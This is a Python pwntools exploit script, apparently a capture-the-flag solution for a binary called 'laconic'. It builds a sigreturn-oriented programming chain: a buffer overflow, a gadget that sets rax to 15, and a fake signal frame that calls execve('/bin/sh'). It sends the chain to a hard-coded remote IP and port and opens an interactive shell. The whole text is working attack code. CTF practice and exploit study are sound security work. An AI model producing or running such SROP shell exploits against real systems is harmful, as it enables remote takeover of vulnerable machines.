from pwn import *
#p = process("./laconic")

p = remote("94.237.63.241",48606)
input("Attach gdb")
elf = context.binary = ELF("laconic", checksec=False)
rop = ROP(elf)
offset = 8 
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
syscall_ret = (rop.find_gadget(['syscall', 'ret'])[0])
binsh = 0x43238 # found from ropper
frame = SigreturnFrame()
frame.rax = 59 # syscall code for execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0xdeadbeef # so we can find it easily
frame.rip = syscall_ret # When the signal context is returned to registers
          # We want to trigger the execve syscall with /bin/sh
rop.raw(b"A" * offset)
rop.raw(p64(pop_rax)) 
rop.raw(p64(0xf))   # pop Sigreturn code into rax
rop.raw(p64(syscall_ret))  # Trigger the sigreturn
rop.raw(bytes(frame))# enter fake signal frame onto the stack
p.sendline(rop.chain())
p.interactive()